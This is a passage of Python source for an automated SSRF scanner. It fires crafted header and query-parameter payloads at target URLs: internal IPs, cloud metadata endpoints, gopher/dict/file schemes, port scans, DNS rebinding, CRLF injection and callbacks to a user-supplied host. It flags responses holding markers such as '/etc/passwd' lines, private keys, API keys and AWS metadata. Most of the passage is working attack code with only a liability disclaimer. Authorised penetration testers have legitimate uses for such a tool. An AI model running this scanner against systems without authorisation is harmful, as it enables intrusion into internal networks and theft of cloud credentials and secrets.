    def analyze_response(self, original_response, test_response):
        """Analyze differences between original and test responses with smart detection"""
        if not test_response:
            return False, {}

        # Don't flag rate limiting as vulnerability
        if test_response.status_code == 429:
            return False, {}

        # Basic differences
        differences = {
            'status_code_changed': original_response.status_code != test_response.status_code,
            'content_length': len(original_response.content) != len(test_response.content),
            'content_type': original_response.headers.get('content-type') != 
                          test_response.headers.get('content-type'),
            'word_count': len(original_response.text.split()) != 
                         len(test_response.text.split())
        }
        
        # Use baseline if available for smarter detection
        if hasattr(self, 'baseline') and self.baseline:
            # Check if status code differs from baseline (HIGH PRIORITY)
            # But ignore rate limiting
            if test_response.status_code not in self.baseline['status_codes'] and test_response.status_code != 429:
                differences['unexpected_status'] = True
                differences['baseline_status'] = list(self.baseline['status_codes'])
                differences['test_status'] = test_response.status_code
                # Status code change is always significant
                return True, differences
            
            # If baseline is stable and response differs significantly, it's interesting
            if self.baseline['stable']:
                length_diff = abs(len(test_response.content) - self.baseline['avg_length'])
                # Flag if difference is > 10% of baseline
                if length_diff > self.baseline['avg_length'] * 0.1:
                    differences['significant_size_change'] = True
                    differences['size_diff_percent'] = (length_diff / self.baseline['avg_length']) * 100
        else:
            # No baseline - use original response for comparison
            if differences['status_code_changed']:
                differences['unexpected_status'] = True
                differences['baseline_status'] = [original_response.status_code]
                differences['test_status'] = test_response.status_code
                return True, differences
        
        # Look for SSRF indicators in response
        ssrf_indicators = [
            b'root:',           # /etc/passwd
            b'admin:',          # User lists
            b'<title>Index of', # Directory listing
            b'AWS',             # Cloud metadata
            b'metadata',        # Cloud metadata
            b'credentials',     # Cloud credentials
            b'private',         # Private keys
            b'BEGIN RSA',       # SSH keys
            b'BEGIN PRIVATE',   # Private keys
            b'api_key',         # API keys
            b'secret',          # Secrets
            b'token',           # Tokens
        ]
        
        for indicator in ssrf_indicators:
            if indicator in test_response.content:
                differences['ssrf_indicator'] = indicator.decode('utf-8', errors='ignore')
                return True, differences  # Definite hit
        
        # Flag if we have significant differences
        significant_diffs = ['status_code_changed', 'significant_size_change', 'unexpected_status', 'ssrf_indicator']
        has_significant = any(differences.get(k, False) for k in significant_diffs)
        
        # Additional check: if status code matches baseline and no SSRF indicators, not vulnerable
        if hasattr(self, 'baseline') and self.baseline:
            if (test_response.status_code in self.baseline['status_codes'] and 
                'ssrf_indicator' not in differences):
                # Status matches baseline and no suspicious content - likely not vulnerable
                return False, differences
        
        return has_significant, differences

    def print_progress(self):
        """Print scan progress with phase information and percentages"""
        if self.quiet_mode:
            return
            
        # Non-blocking progress print (no lock needed for reading)
        total_progress = self.progress.get_total_progress()
        current_phase = self.progress.current_phase or "Initializing"
        
        # Clear line and move cursor to beginning
        print('\r' + ' ' * 150 + '\r', end='', flush=True)
        
        # Calculate success rate
        success_rate = 0
        if self.total_requests_attempted > 0:
            success_rate = (self.total_requests_succeeded / self.total_requests_attempted) * 100
        
        # Calculate requests per second
        req_per_sec = 0
        if hasattr(self, 'scan_start_time'):
            elapsed = time.time() - self.scan_start_time
            if elapsed > 0:
                req_per_sec = self.total_requests_succeeded / elapsed
        
        # Calculate actual progress based on requests (more accurate than weighted phases)
        estimated_total_requests = 28300  # Approximate total for all phases
        actual_progress = (self.total_requests_attempted / estimated_total_requests * 100) if estimated_total_requests > 0 else 0
        actual_progress = min(actual_progress, 100)
        
        # Print progress information with request stats
        print(f"URLs: {self.nrUrlsAnalyzed}/{self.nrTotUrls} | "
              f"Requests: {self.total_requests_succeeded:,}/{self.total_requests_attempted:,} "
              f"({req_per_sec:.1f} req/s) | "
              f"Phase: {current_phase} | "
              f"Progress: {actual_progress:.1f}%", end='', flush=True)

    def update_progress(self, phase, completed, total):
        """Update progress for a specific phase"""
        progress = (completed / total * 100) if total > 0 else 100
        self.progress.update_phase(phase, progress/100)
        self.print_progress()

    async def perform_attack(self, url: str, attack_type: str, payload: str, headers: Dict[str, str], original_response) -> Optional[ScanResult]:
        """Perform an attack and record the result"""
        try:
            response = await self.make_request(url, headers=headers)
            if not response:
                return None

            is_vulnerable, differences = self.analyze_response(original_response, response)
            
            result = ScanResult(
                url=url,
                attack_type=attack_type,
                payload=payload,
                response_code=response.status_code,
                response_size=len(response.content),
                timestamp=datetime.now(),
                headers=headers,
                is_vulnerable=is_vulnerable,
                notes=str(differences) if differences else ""
            )

            if is_vulnerable:
                result.verification_method = self.verify_vulnerability(url, payload, response, original_response)
                self.reporter.add_result(result)

            return result

        except Exception as e:
            if self.config.scanner['debug']:
                self.logger.error(f"Error performing {attack_type} attack on {url}: {str(e)}")
            return None

    async def localAttack(self, url, original_response):
        """Enhanced local IP attack with payload generation"""
        base_ips = self.local_ips.copy()
        
        # Generate additional IP variations
        all_ips = []
        for ip in base_ips:
            variations = self.payload_generator.generate_ip_variations(ip)
            all_ips.extend(variations)
        
        total_tests = len(self.headers) * len(all_ips)
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for ip in all_ips:
                for payload in self.payload_generator.generate_url_encodings(ip):
                    badHeader = {header: payload}
                    tasks.append(self.perform_attack(url, 'LocalIP', payload, badHeader, original_response))
        
        # Execute all tasks concurrently
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 100 == 0:
                self.update_progress('Local IP', completed_tests, total_tests)

    async def cloudMetadataAttack(self, url, original_response):
        """Enhanced cloud metadata attack with payload variations"""
        total_tests = len(self.headers) * len(self.cloud_metadata)
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for metadata_url in self.cloud_metadata:
                variations = self.payload_generator.generate_url_encodings(metadata_url)
                for payload in variations:
                    badHeader = {header: payload}
                    tasks.append(self.perform_attack(url, 'CloudMetadata', payload, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 50 == 0:
                self.update_progress('Cloud Metadata', completed_tests, total_tests)

    async def protocolAttack(self, url, original_response):
        """Enhanced protocol attack with protocol-specific handlers"""
        total_tests = len(self.headers) * len(self.protocols) * min(len(self.local_ips), 5)
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for protocol in self.protocols:
                for ip in self.local_ips[:5]:
                    # Get protocol-specific payloads
                    if protocol == 'gopher://':
                        payloads = self.protocol_handler.handle_gopher(ip)
                    elif protocol == 'dict://':
                        payloads = self.protocol_handler.handle_dict(ip)
                    elif protocol == 'file://':
                        payloads = self.protocol_handler.handle_file(ip)
                    else:
                        payloads = self.payload_generator.generate_protocol_variations(protocol, ip)
                    
                    for payload in payloads:
                        badHeader = {header: payload}
                        tasks.append(self.perform_attack(url, 'Protocol', payload, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 50 == 0:
                self.update_progress('Protocol', completed_tests, total_tests)

    async def encodedAttack(self, url, original_response):
        """Enhanced encoded attack with multiple encoding variations"""
        total_tests = len(self.headers) * len(self.encoded_payloads)
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for base_payload in self.encoded_payloads:
                encoded_variations = [
                    base_payload,
                    quote(base_payload),
                    quote(quote(base_payload)),
                    base64.b64encode(base_payload.encode()).decode(),
                    base_payload.replace('.', '%2e').replace('/', '%2f'),
                ]
                
                for payload in encoded_variations:
                    badHeader = {header: payload}
                    tasks.append(self.perform_attack(url, 'Encoded', payload, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 50 == 0:
                self.update_progress('Encoded', completed_tests, total_tests)

    async def parameterAttack(self, url, original_response):
        """Perform SSRF attack using parameter injection"""
        total_tests = len(self.parameter_payloads)
        completed_tests = 0
        
        tasks = []
        for param in self.parameter_payloads:
            if '?' in url:
                test_url = f"{url}&{param}"
            else:
                test_url = f"{url}?{param}"
            
            tasks.append(self.make_request(test_url))
        
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        for param, response in zip(self.parameter_payloads, responses):
            completed_tests += 1
            if completed_tests % 20 == 0:
                self.update_progress('Parameter', completed_tests, total_tests)
            
            if response and not isinstance(response, Exception):
                is_vulnerable, differences = self.analyze_response(original_response, response)
                if is_vulnerable:
                    result = ScanResult(
                        url=url,
                        attack_type='Parameter',
                        payload=param,
                        response_code=response.status_code,
                        response_size=len(response.content),
                        timestamp=datetime.now(),
                        headers={},
                        is_vulnerable=True,
                        notes=str(differences)
                    )
                    self.log_vulnerability(result)

    async def parameterCallbackAttack(self, url, original_response):
        """
        For URLs that already have query parameters, replace each parameter's value
        with SSRF callback-style payloads (Burp Collaborator / backurl variations).
        """
        # Parse URL and check for existing query params
        parsed = urlparse(url)
        if not parsed.query:
            # No parameters to replace, nothing to do
            return

        # Original query params as list of (name, value) pairs
        query_pairs = parse_qsl(parsed.query, keep_blank_values=True)

        # Build callback-style payloads:
        #  - Variations based on self.backurl (if provided)
        #  - DNS rebinding payloads (with <BURP-COLLABORATOR> replaced when possible)
        callback_payloads = []

        # backurl-based variations (same idea as remoteAttack)
        if self.backurl:
            callback_payloads.extend([
                self.backurl,
                f"http://{self.backurl}",
                f"https://{self.backurl}",
                f"{self.backurl}/ssrf-test",
                f"{self.backurl}?callback=true",
                f"http://{self.backurl}:80",
                f"http://{self.backurl}:443",
                f"http://{self.backurl}:8080",
                quote(f"http://{self.backurl}"),
                quote(quote(f"http://{self.backurl}")),
            ])

        # DNS rebinding payloads (same semantics as dnsRebindingAttack)
        for dns in self.dns_rebinding:
            payload = dns
            if '<BURP-COLLABORATOR>' in dns and self.backurl:
                payload = dns.replace('<BURP-COLLABORATOR>', self.backurl)
            callback_payloads.append(payload)

        # Deduplicate while preserving order
        callback_payloads = list(dict.fromkeys(callback_payloads))

        if not callback_payloads:
            # Nothing to inject
            return

        total_tests = len(query_pairs) * len(callback_payloads)
        completed_tests = 0

        tasks = []
        meta = []  # (param_name, payload, test_url)

        # For each parameter, create variants where its value is replaced
        for idx, (name, value) in enumerate(query_pairs):
            for payload in callback_payloads:
                # Create a new list of query params with this one modified
                new_pairs = [
                    (n, payload if i == idx else v)
                    for i, (n, v) in enumerate(query_pairs)
                ]
                new_query = urlencode(new_pairs, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))

                tasks.append(self.make_request(new_url))
                meta.append((name, payload, new_url))

        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for (param_name, payload, test_url), response in zip(meta, responses):
            completed_tests += 1
            # Re-use "Parameter" phase for progress
            if completed_tests % 20 == 0:
                self.update_progress('Parameter', completed_tests, total_tests)

            if not response or isinstance(response, Exception):
                continue

            is_vulnerable, differences = self.analyze_response(original_response, response)
            if is_vulnerable:
                # Record the finding
                result = ScanResult(
                    url=test_url,
                    attack_type='ParameterCallback',
                    payload=f"{param_name}={payload}",
                    response_code=response.status_code,
                    response_size=len(response.content),
                    timestamp=datetime.now(),
                    headers={},  # this attack is URL-parameter-based
                    is_vulnerable=True,
                    notes=str(differences)
                )
                # Try to verify with existing verification logic
                result.verification_method = self.verify_vulnerability(
                    test_url,
                    payload,
                    response,
                    original_response
                )
                # Log + report
                self.log_vulnerability(result)
                if self.reporter:
                    self.reporter.add_result(result)

    async def portScanAttack(self, url, original_response):
        """Perform SSRF port scan attack"""
        total_tests = len(self.headers) * len(self.port_payloads) * min(len(self.local_ips), 5)
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for port in self.port_payloads:
                for ip in self.local_ips[:5]:
                    payload = f"{ip}{port}"
                    badHeader = {header: payload}
                    tasks.append(self.perform_attack(url, 'PortScan', payload, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 50 == 0:
                self.update_progress('Port Scan', completed_tests, total_tests)

    async def dnsRebindingAttack(self, url, original_response):
        """Perform DNS rebinding attack"""
        total_tests = len(self.headers) * len(self.dns_rebinding)
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for dns in self.dns_rebinding:
                payload = dns
                if '<BURP-COLLABORATOR>' in dns and self.backurl:
                    payload = dns.replace('<BURP-COLLABORATOR>', self.backurl)
                
                badHeader = {header: payload}
                tasks.append(self.perform_attack(url, 'DNSRebinding', payload, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 20 == 0:
                self.update_progress('DNS Rebinding', completed_tests, total_tests)

    async def remoteAttack(self, url, original_response):
        """Perform remote SSRF attack using callback URL"""
        if not self.backurl:
            return
        
        # Generate various callback URL formats
        callback_variations = [
            self.backurl,
            f"http://{self.backurl}",
            f"https://{self.backurl}",
            f"{self.backurl}/ssrf-test",
            f"{self.backurl}?callback=true",
            f"http://{self.backurl}:80",
            f"http://{self.backurl}:443",
            f"http://{self.backurl}:8080",
            quote(f"http://{self.backurl}"),
            quote(quote(f"http://{self.backurl}")),
        ]
        
        total_tests = len(self.headers) * len(callback_variations)
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for callback in callback_variations:
                badHeader = {header: callback}
                tasks.append(self.perform_attack(url, 'Remote', callback, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 20 == 0:
                self.update_progress('Remote', completed_tests, total_tests)

    async def crlfInjectionAttack(self, url, original_response):
        """Perform CRLF injection attack to manipulate HTTP requests"""
        # Calculate actual total: 2 tasks per (header × crlf × ip)
        total_tests = len(self.headers) * len(self.crlf_injection) * min(len(self.local_ips), 3) * 2
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for crlf_payload in self.crlf_injection:
                # Test CRLF with local IPs
                for ip in self.local_ips[:3]:
                    # Inject CRLF before the IP
                    payload = f"{ip}{crlf_payload}"
                    badHeader = {header: payload}
                    tasks.append(self.perform_attack(url, 'CRLF_Injection', payload, badHeader, original_response))
                    
                    # Also test CRLF after protocol
                    payload_with_protocol = f"http://{ip}{crlf_payload}"
                    badHeader = {header: payload_with_protocol}
                    tasks.append(self.perform_attack(url, 'CRLF_Injection', payload_with_protocol, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 50 == 0:
                self.update_progress('CRLF Injection', completed_tests, total_tests)

    async def schemeConfusionAttack(self, url, original_response):
        """Perform scheme confusion attack using alternative protocols"""
        # Combine scheme_confusion payloads with existing protocols
        all_schemes = self.scheme_confusion.copy()
        
        # Also test protocols.txt with local IPs
        for protocol in self.protocols:
            for ip in self.local_ips[:5]:
                all_schemes.append(f"{protocol}{ip}")
        
        total_tests = len(self.headers) * len(all_schemes)
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for scheme_payload in all_schemes:
                badHeader = {header: scheme_payload}
                tasks.append(self.perform_attack(url, 'Scheme_Confusion', scheme_payload, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 50 == 0:
                self.update_progress('Scheme Confusion', completed_tests, total_tests)

    def verify_vulnerability(self, url: str, payload: str, response, original_response=None) -> str:
        """Verify if the potential vulnerability is real"""
        # Pass original_response to verification methods that need it
        verification_methods = [
            lambda r: self._verify_response_code(r, original_response),
            self._verify_response_content,
            self._verify_response_headers,
            self._verify_timing_difference
        ]

        for i, method in enumerate(verification_methods):
            try:
                if method(response):
                    # Return the actual method name for the first one
                    if i == 0:
                        return "_verify_response_code"
                    else:
                        return method.__name__
            except:
                continue
        return "unverified"

    def _verify_response_code(self, response, original_response=None) -> bool:
        """Verify vulnerability based on response code"""
        # Don't flag rate limiting as vulnerability
        if response.status_code == 429:
            return False
        
        # If we have original response, only flag if status changed
        if original_response:
            # Check against baseline if available
            if hasattr(self, 'baseline') and self.baseline:
                # Only flag if status is NOT in baseline
                return response.status_code not in self.baseline['status_codes']
            else:
                # No baseline - check if different from original
                return response.status_code != original_response.status_code
        
        # Fallback: flag common success codes (but this shouldn't happen)
        return response.status_code in [200, 301, 302, 307]

    def _verify_response_content(self, response) -> bool:
        """Verify vulnerability based on response content"""
        # Don't flag rate limiting as vulnerability
        if response.status_code == 429:
            return False
            
        indicators = [
            'root:',
            'admin:',
            'internal',
            'password',
            'key',
            'uid=',
            'metadata',
            'aws',
            'secret'
        ]
        return any(indicator in response.text.lower() for indicator in indicators)

    def _verify_response_headers(self, response) -> bool:
        """Verify vulnerability based on response headers"""
        suspicious_headers = [
            'x-internal',
            'server-internal',
            'x-backend-server',
            'x-upstream',
            'x-host',
            'x-forwarded-server'
        ]
        return any(header.lower() in response.headers for header in suspicious_headers)

    def _verify_timing_difference(self, response) -> bool:
        """Verify vulnerability based on response timing"""
        return response.elapsed.total_seconds() > 2.0

    def log_vulnerability(self, result: ScanResult):
        """Log detected vulnerability"""
        with self.file_lock:
            # Rename verification method names for output
            verification_name = result.verification_method
            if verification_name == "_verify_response_code":
                verification_name = "Response Code Analysis"
            elif verification_name == "_verify_response_content":
                verification_name = "Response Content Analysis"
            elif verification_name == "_verify_response_headers":
                verification_name = "Response Headers Analysis"
            elif verification_name == "_verify_timing_difference":
                verification_name = "Timing Analysis"
            
            self.logger.warning(f"\nPotential SSRF vulnerability found!")
            self.logger.warning(f"URL: {result.url}")
            self.logger.warning(f"Attack Type: {result.attack_type}")
            self.logger.warning(f"Payload: {result.payload}")
            self.logger.warning(f"Response Code: {result.response_code}")
            self.logger.warning(f"Verification Method: {verification_name}")
            self.logger.warning("-" * 50)

    def checkIfLogResult(self, original_response, response, tempResponses, logInfo):
        """Check if response should be logged"""
        is_different, differences = self.analyze_response(original_response, response)
        
        if is_different:
            response_code = str(response.status_code)
            response_size = str(len(response.content))
            
            if response_code not in tempResponses:
                tempResponses[response_code] = [response_size]
                logInfo['ResponseCode'] = response_code
                logInfo['ResponseSize'] = response_size
                self.log_result(logInfo)
            elif response_size not in tempResponses[response_code]:
                tempResponses[response_code].append(response_size)
                logInfo['ResponseCode'] = response_code
                logInfo['ResponseSize'] = response_size
                self.log_result(logInfo)

    def log_result(self, info):
        """Log scan results to files"""
        with self.file_lock:
            # Write to CSV
            with open(self.csv_output, 'a', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=info.keys())
                if f.tell() == 0:
                    writer.writeheader()
                writer.writerow(info)
            
            # Write to JSON
            results = []
            if os.path.exists(self.json_output):
                with open(self.json_output, 'r') as f:
                    try:
                        results = json.load(f)
                    except json.JSONDecodeError:
                        results = []
            
            results.append(info)
            with open(self.json_output, 'w') as f:
                json.dump(results, f, indent=2)
            
            # Write to TXT
            with open(self.txt_output, 'a') as f:
                f.write(f"\nPotential SSRF Found!\n")
                f.write(f"URL: {info['Hostname']}\n")
                f.write(f"Attack Type: {info['AttackType']}\n")
                f.write(f"Header: {info['HeaderField']}\n")
                f.write(f"Payload: {info['HeaderValue']}\n")
                f.write(f"Response Code: {info['ResponseCode']}\n")
                f.write(f"Response Size: {info['ResponseSize']}\n")
                f.write("-" * 50 + "\n")

    async def performAllAttack(self, url, baseline=None):
        """Perform all SSRF attacks"""
        if not self.quiet_mode:
            print(f"[*] Fetching original response from {url}...")
        
        original_response = await self.make_request(url)
        
        if original_response:
            if not self.quiet_mode:
                print(f"[*] Got response (Status: {original_response.status_code}, Size: {len(original_response.content)} bytes)")
                print(f"[*] Starting attack phases...")
            
            # Store baseline for comparison
            self.baseline = baseline
            
            try:
                self.progress.current_phase = "Local IP"
                await self.localAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in Local IP attack: {str(e)}")
            
            try:
                self.progress.current_phase = "Cloud Metadata"
                await self.cloudMetadataAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in Cloud Metadata attack: {str(e)}")
            
            try:
                self.progress.current_phase = "Protocol"
                await self.protocolAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in Protocol attack: {str(e)}")
            
            try:
                self.progress.current_phase = "Encoded"
                await self.encodedAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in Encoded attack: {str(e)}")
            
            try:
                self.progress.current_phase = "Parameter"
                # Existing behavior: append extra parameters from payloads/parameter_payloads.txt
                await self.parameterAttack(url, original_response)
                # New behavior: replace existing parameter values with callback-style payloads
                await self.parameterCallbackAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in Parameter attack: {str(e)}")
            
            try:
                self.progress.current_phase = "Port Scan"
                await self.portScanAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in Port Scan attack: {str(e)}")
            
            try:
                self.progress.current_phase = "DNS Rebinding"
                await self.dnsRebindingAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in DNS Rebinding attack: {str(e)}")
            
            try:
                self.progress.current_phase = "CRLF Injection"
                await self.crlfInjectionAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in CRLF Injection attack: {str(e)}")
            
            try:
                self.progress.current_phase = "Scheme Confusion"
                await self.schemeConfusionAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in Scheme Confusion attack: {str(e)}")
            
            # Only run remote attack if backurl is provided
            if self.backurl:
                try:
                    self.progress.current_phase = "Remote"
                    await self.remoteAttack(url, original_response)
                except Exception as e:
                    self.logger.error(f"Error in Remote attack: {str(e)}")
        else:
            async with self.lock:
                self.nrErrorUrl += 1
            if not self.quiet_mode:
                print(Fore.RED + f"\n[!] Failed to get response from {url}")
                print(Fore.YELLOW + f"[*] Check network connectivity or try with -d for debug info")

    async def baseline_target(self, url):
        """Create baseline fingerprint of target to reduce false positives"""
        baselines = []
        max_attempts = 3
        
        for attempt in range(max_attempts):
            try:
                response = await self.make_request(url)
                if response:
                    baselines.append({
                        'status': response.status_code,
                        'length': len(response.content),
                        'content_hash': hash(response.content)
                    })
                await asyncio.sleep(0.2)  # Small delay between baselines
            except Exception as e:
                if self.config.scanner['debug']:
                    self.logger.error(f"Baseline attempt {attempt + 1} failed: {str(e)}")
                await asyncio.sleep(0.5)  # Wait longer on error
                continue
        
        if not baselines:
            if not self.quiet_mode:
                print(f"\n[!] Warning: Could not establish baseline for {url}")
                print(f"[*] Continuing scan without baseline (may have more false positives)")
            return None
            
        # Calculate baseline statistics
        return {
            'status_codes': set(b['status'] for b in baselines),
            'avg_length': sum(b['length'] for b in baselines) / len(baselines),
            'length_variance': max(b['length'] for b in baselines) - min(b['length'] for b in baselines),
            'stable': len(set(b['content_hash'] for b in baselines)) == 1  # All responses identical
        }
    
    async def scan_url(self, url):
        """Process a single URL"""
        async with self.lock:
            self.nrUrlsAnalyzed += 1
        self.print_progress()
        
        # Create baseline first
        if not self.quiet_mode:
            print(f"\n[*] Creating baseline for {url}...")
        
        baseline = await self.baseline_target(url)
        
        if baseline:
            if not self.quiet_mode:
                print(f"[*] Baseline: Status={baseline['status_codes']}, "
                      f"AvgSize={baseline['avg_length']:.0f}, "
                      f"Stable={'Yes' if baseline['stable'] else 'No'}")
        else:
            # Create a minimal baseline to allow scanning to continue
            if not self.quiet_mode:
                print(f"[*] Using permissive detection mode (no baseline)")
        
        await self.performAllAttack(url, baseline)

    def print_final_summary(self):
        """Print scanner-specific statistics (response codes, failures, etc.)"""
        if not self.quiet_mode:
            # Only print scanner-specific stats, not duplicating reporter output
            if self.response_codes:
                print(f"\n📋 Response Code Breakdown:")
                for code, count in sorted(self.response_codes.items(), key=lambda x: x[1], reverse=True)[:10]:
                    print(f"  {code}: {count:,} responses")
            
            if self.failure_reasons:
                print(f"\n❌ Failure Breakdown:")
                for reason, count in sorted(self.failure_reasons.items(), key=lambda x: x[1], reverse=True)[:5]:
                    print(f"  {reason}: {count:,}")

    async def run(self, urls=None, url_file=None):
        """Run the SSRF scanner"""
        url_list = []
        
        if urls:
            url_list = urls
            self.nrTotUrls = len(urls)
        elif url_file:
            with open(url_file) as f:
                url_list = [line.strip() for line in f if line.strip()]
                self.nrTotUrls = len(url_list)

        # Initialize reporter with output format
        self.reporter = Reporter(
            self.config.scanner['output_dir'],
            self.config.output['format']
        )

        # Initialize locks
        self.lock = asyncio.Lock()
        self.file_lock = threading.Lock()
        
        # Create semaphore for concurrency control
        self.semaphore = asyncio.Semaphore(self.config.scanner['concurrency'])
        
        # Create session
        await self.request_manager.create_session()
        
        # Print configuration
        if not self.quiet_mode:
            print(f"\n[*] Configuration:")
            print(f"    Concurrency: {self.config.scanner['concurrency']}")
            print(f"    Rate Limit: {self.config.rate_limiting['requests_per_second']} req/s")
            print(f"    Timeout: {self.config.scanner['timeout']}s")
            print(f"    Output Format: {self.config.output['format']}")
            if self.config.scanner.get('proxy'):
                print(f"    Proxy: {self.config.scanner['proxy']}")
            print()
        
        # Start timing
        self.scan_start_time = time.time()
        
        try:
            # Process all URLs concurrently
            tasks = [self.scan_url(url) for url in url_list]
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            # Close session
            await self.request_manager.close_session()
            
            # Calculate total scan time
            if self.scan_start_time:
                scan_duration = time.time() - self.scan_start_time
                if not self.quiet_mode:
                    print(f"\n\n⏱️  Total Scan Time: {scan_duration:.2f} seconds")
        
        # Pass scanner stats to reporter for accurate final summary
        self.reporter._scanner_stats = {
            'total_attempted': self.total_requests_attempted,
            'total_succeeded': self.total_requests_succeeded,
            'total_failed': self.total_requests_failed,
            'success_rate': (self.total_requests_succeeded / self.total_requests_attempted * 100) if self.total_requests_attempted > 0 else 0,
            'response_codes': self.response_codes,
            'failure_reasons': self.failure_reasons
        }
        
        # Print scanner-specific stats first
        self.print_final_summary()
        
        # Generate and print reporter summary
        summary = self.reporter.generate_summary()
        print(summary)



def printBanner():
    print("""

            ░██████╗░██████╗██████╗░███████╗
            ██╔════╝██╔════╝██╔══██╗██╔════╝
            ╚█████╗░╚█████╗░██████╔╝█████╗░░
            ░╚═══██╗░╚═══██╗██╔══██╗██╔══╝░░
            ██████╔╝██████╔╝██║░░██║██║░░░░░
            ╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝
    """)
    print(__version__ + " by Dancas")
    print(Fore.YELLOW + "[WRN] Use with caution. You are responsible for your actions")
    print(Fore.YELLOW + "[WRN] Developers assume no liability and are not responsible for any misuse or damage.")

def print_help():
    print(Fore.GREEN + "SSRF Scanner Help Menu")
    print(Fore.GREEN + "Usage:")
    print("  -h, --help          : Show this help message")
    print("  -u, --url           : Single URL to scan")
    print("  -f, --file          : File containing URLs to scan")
    print("  -b, --backurl       : Callback URL for remote SSRF detection")
    print("  -d, --debug         : Enable debug mode")
    print("  -c, --cookie        : Manually set cookies (format: 'name1=value1; name2=value2')")
    # Header
    print("  --concurrency N     : Number of concurrent requests (default: 200)")
    print("  --rate-limit N      : Max requests per second (default: 100)")
    print("  -q, --quiet         : Only show vulnerabilities (no progress)")
    print("  --proxy URL         : Proxy URL (e.g., http://127.0.0.1:8080)")
    print("  --proxy-auth U:P    : Proxy authentication (username:password)")
    print("  --output-format FMT : Output format: json, csv, html, txt, all (default: csv)")
    print("\nExample:")
    print("  python3 ssrf_scanner.py -u https://example.com")
    print("  python3 ssrf_scanner.py -f urls.txt --concurrency 200")
    print("  python3 ssrf_scanner.py -u https://example.com --proxy http://127.0.0.1:8080")
    print("  python3 ssrf_scanner.py -u https://example.com --output-format html,json")
    print("  python3 ssrf_scanner.py -u https://example.com -q --rate-limit 10")

async def main():
    try:
        opts, args = getopt.getopt(
            sys.argv[1:], 
            "hu:f:b:dc:qH:",   # added H:
            ["help", "url=", "file=", "backurl=", "debug", "cookie=", 
             "concurrency=", "rate-limit=", "quiet", "proxy=", 
             "proxy-auth=", "output-format=", "header="]  # added header=
        )

    except getopt.GetoptError as err:
        print(str(err))
        sys.exit(2)

    url = None
    url_file = None
    backurl = None
    debug = False
    cookies = None
    concurrency = 200
    rate_limit = 100
    quiet = False
    proxy = None
    proxy_auth = None
    output_format = 'csv'
    custom_headers = []  # list of raw "-H 'Name: value'" strings


    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print_help()
            sys.exit()
        elif opt in ("-u", "--url"):
            url = arg
        elif opt in ("-f", "--file"):
            url_file = arg
        elif opt in ("-b", "--backurl"):
            backurl = arg
        elif opt in ("-d", "--debug"):
            debug = True
        elif opt in ("-c", "--cookie"):
            cookies = arg
        elif opt == "--concurrency":
            concurrency = int(arg)
        elif opt == "--rate-limit":
            rate_limit = int(arg)
        elif opt in ("-q", "--quiet"):
            quiet = True
        elif opt == "--proxy":
            proxy = arg
        elif opt == "--proxy-auth":
            proxy_auth = arg
        elif opt == "--output-format":
            output_format = arg
        elif opt in ("-H", "--header"):
            # e.g. -H "Authorization: Bearer xyz"
            custom_headers.append(arg)


    if not (url or url_file):
        print("Error: Must provide either URL or file")
        sys.exit(1)

    scanner = SSRFScanner()
    if debug:
        scanner.config.scanner['debug'] = True
    if backurl:
        scanner.backurl = backurl
    if cookies:
        scanner.cookies = cookies

    # Apply static headers from CLI (-H/--header) to all requests
    if custom_headers:
        # Ensure the attribute exists
        if not hasattr(scanner, "static_headers"):
            scanner.static_headers = {}
        for hdr in custom_headers:
